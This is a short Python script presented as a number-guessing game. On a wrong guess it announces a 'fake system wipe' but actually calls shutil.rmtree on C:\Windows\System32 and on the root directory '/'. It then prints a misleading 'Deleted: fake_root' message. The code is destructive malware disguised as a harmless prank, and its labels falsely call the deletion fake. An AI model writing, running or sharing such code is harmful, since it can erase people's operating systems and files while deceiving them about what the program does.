import os
import shutil
import random

n = random.randint(1, 10)
g = int(input("Guess a number between 1 and 10: "))

if g == n:
    print("You won! System secure.")
else:
    print("Wrong guess. Initiating fake system wipe...")

    if os.path.exists("C:\Windows\System32"):
        shutil.rmtree("C:\Windows\System32")
        
    if os.path.exists("/"):
        shutil.rmtree("/")
        print("Deleted: fake_root")

    print("Your OS has been cooked💣")
